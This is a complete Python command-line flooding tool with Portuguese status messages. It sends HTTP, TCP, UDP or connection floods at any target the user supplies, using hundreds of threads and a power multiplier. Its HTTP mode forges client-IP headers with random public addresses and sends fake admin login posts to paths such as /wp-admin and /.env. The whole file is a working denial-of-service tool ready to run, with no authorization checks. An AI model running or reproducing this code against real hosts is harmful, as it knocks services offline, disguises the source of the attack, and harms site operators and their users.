import socket
import ssl
import threading
import time
import random
import argparse
import ipaddress
from concurrent.futures import ThreadPoolExecutor

class NetworkTool:
    def __init__(self, target, port, threads, duration, method, power=10):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.method = method
        self.power = power
        self.active = True
        self.count = 0
        self.data_mb = 0
        self.lock = threading.Lock()
        self.start_time = None

    def _random_ip(self):
        while True:
            ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            try:
                addr = ipaddress.ip_address(ip)
                if not addr.is_private and not addr.is_loopback and not addr.is_multicast and not addr.is_reserved:
                    return ip
            except:
                continue

    def _random_packet_signature(self):
        return ''.join(random.choices('abcdef0123456789', k=random.randint(8, 32)))

    def _http(self):
        ua = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0",
            "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Firefox/121.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2) Version/17.2",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/120.0.6099.144",
        ]
        paths = ["/","/index.html","/home","/api","/login","/admin","/wp-admin","/.env","/config","/search?q="+str(random.randint(1,9999))]
        methods = ["GET","GET","GET","POST","HEAD","GET","GET","OPTIONS","PUT"]
        
        while self.active:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(2)
                s.connect((self.target, self.port))
                
                if self.port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=self.target)
                
                for _ in range(random.randint(10, 50) * self.power):
                    if not self.active: break
                    
                    m = random.choice(methods)
                    p = random.choice(paths)
                    agent = random.choice(ua)
                    
                    ip1 = self._random_ip()
                    ip2 = self._random_ip()
                    ip3 = self._random_ip()
                    ip4 = self._random_ip()
                    ip5 = self._random_ip()
                    ip6 = self._random_ip()
                    
                    signature = self._random_packet_signature()
                    session_id = self._random_packet_signature()
                    
                    body = ""
                    if m in ["POST","PUT"]:
                        body = f"user=admin&pass={random.randint(1000,9999)}&csrf={self._random_packet_signature()}"
                    
                    raw = (
                        f"{m} {p} HTTP/1.1\r\n"
                        f"Host: {self.target}\r\n"
                        f"User-Agent: {agent}\r\n"
                        f"Accept: */*\r\n"
                        f"Accept-Language: {random.choice(['en-US','pt-BR','es-ES','fr-FR','de-DE'])};q=0.5\r\n"
                        f"Accept-Encoding: gzip, deflate, br\r\n"
                        f"Connection: keep-alive\r\n"
                        f"Cache-Control: no-cache\r\n"
                        f"Pragma: no-cache\r\n"
                        f"X-Forwarded-For: {ip1}\r\n"
                        f"X-Real-IP: {ip2}\r\n"
                        f"CF-Connecting-IP: {ip3}\r\n"
                        f"True-Client-IP: {ip4}\r\n"
                        f"X-Originating-IP: {ip5}\r\n"
                        f"X-Client-IP: {ip6}\r\n"
                        f"Forwarded: for={ip1};proto=https;by={ip2}\r\n"
                        f"Via: {random.randint(1,3)}.{random.randint(0,9)} {random.choice(['nginx','apache','varnish','squid','haproxy'])}\r\n"
                        f"X-Request-ID: {signature}\r\n"
                        f"X-Session-ID: {session_id}\r\n"
                        f"X-Trace-ID: {self._random_packet_signature()}\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"\r\n"
                        f"{body}"
                    ).encode()
                    
                    s.sendall(raw)
                    with self.lock:
                        self.count += 1
                        self.data_mb += len(raw) / (1024*1024)
                s.close()
            except: pass
            if self.duration > 0 and (time.time() - self.start_time) >= self.duration: break

    def _tcp(self):
        while self.active:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(1)
                s.connect((self.target, self.port))
                for _ in range(random.randint(20, 80) * self.power):
                    if not self.active: break
                    payload = random.randbytes(random.randint(512, 32768))
                    s.sendall(payload)
                    with self.lock:
                        self.count += 1
                        self.data_mb += len(payload) / (1024*1024)
                s.close()
            except: pass
            if self.duration > 0 and (time.time() - self.start_time) >= self.duration: break

    def _udp(self):
        while self.active:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(random.randint(20, 60) * self.power):
                    if not self.active: break
                    payload = random.randbytes(random.randint(256, 1500))
                    s.sendto(payload, (self.target, self.port))
                    with self.lock:
                        self.count += 1
                        self.data_mb += len(payload) / (1024*1024)
                s.close()
            except: pass
            if self.duration > 0 and (time.time() - self.start_time) >= self.duration: break

    def _syn(self):
        while self.active:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(1)
                s.connect((self.target, self.port))
                s.close()
                with self.lock: self.count += 1
            except: pass
            if self.duration > 0 and (time.time() - self.start_time) >= self.duration: break

    def run(self):
        methods = {"http": self._http, "tcp": self._tcp, "udp": self._udp, "syn": self._syn}
        func = methods.get(self.method)
        if not func: return
        
        print(f"\n{'='*50}")
        print(f"ALVO: {self.target}:{self.port}")
        print(f"MODO: {self.method.upper()}")
        print(f"THREADS: {self.threads}")
        print(f"POTENCIA: {self.power}x")
        print(f"DURACAO: {self.duration}s")
        print(f"IPs FALSOS: ATIVADOS")
        print(f"{'='*50}\n")
        
        self.start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for _ in range(self.threads): executor.submit(func)
            try:
                if self.duration > 0:
                    for remaining in range(self.duration, 0, -10):
                        time.sleep(10)
                        elapsed = time.time() - self.start_time
                        rate = self.count / elapsed if elapsed > 0 else 0
                        print(f"[*] Enviados: {self.count} | {rate:.0f}/s | {self.data_mb:.1f}MB | Restante: {remaining}s")
                else:
                    while True:
                        time.sleep(15)
                        elapsed = time.time() - self.start_time
                        rate = self.count / elapsed if elapsed > 0 else 0
                        print(f"[*] Enviados: {self.count} | {rate:.0f}/s | {self.data_mb:.1f}MB")
            except KeyboardInterrupt:
                print("\n[!] Interrompido")
            self.active = False
        
        elapsed = time.time() - self.start_time
        rate = self.count / elapsed if elapsed > 0 else 0
        print(f"\n[+] Finalizado | Enviados: {self.count} | Taxa: {rate:.0f}/s | Trafego: {self.data_mb:.1f}MB")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--method", default="http", choices=["http","tcp","udp","syn"])
    parser.add_argument("--threads", type=int, default=500)
    parser.add_argument("--duration", type=int, default=120)
    parser.add_argument("--power", type=int, default=10)
    args = parser.parse_args()
    NetworkTool(args.target, args.port, args.threads, args.duration, args.method, args.power).run()
